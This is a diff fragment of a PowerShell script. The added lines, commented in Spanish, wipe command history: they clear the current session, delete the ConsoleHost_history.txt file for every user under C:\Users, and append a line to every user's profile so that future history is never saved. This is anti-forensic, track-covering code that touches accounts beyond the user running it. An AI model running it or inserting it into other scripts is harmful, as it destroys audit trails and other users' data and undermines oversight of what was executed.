@@ -28,3 +28,32 @@ for ($count = 1; $count -le $maxIterations; $count++) {
 
     Start-Sleep -Seconds 26
 }
+
+# 1. Limpiar historial de la sesión actual
+Clear-History
+Set-PSReadLineOption -HistorySaveStyle SaveNothing
+
+# 2. Borrar todos los archivos de historial persistente de todos los usuarios
+Get-ChildItem "C:\Users" -Recurse -ErrorAction SilentlyContinue -Include ConsoleHost_history.txt | ForEach-Object {
+    try {
+        Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+# 3. Desactivar historial futuro en los perfiles de todos los usuarios
+$allUsersProfiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    Join-Path $_.FullName "Documents\PowerShell\Microsoft.PowerShell_profile.ps1"
+}
+
+foreach ($profile in $allUsersProfiles) {
+    try {
+        # Crear archivo si no existe
+        if (!(Test-Path $profile)) { New-Item -ItemType File -Path $profile -Force }
+
+        # Escribir la instrucción para no guardar historial
+        Add-Content -Path $profile -Value "Set-PSReadLineOption -HistorySaveStyle SaveNothing"
+    } catch {}
+}
+
+# 4. Mensaje final
+Write-Host "Historial eliminado y prevención de almacenamiento futuro activada para todos los usuarios."
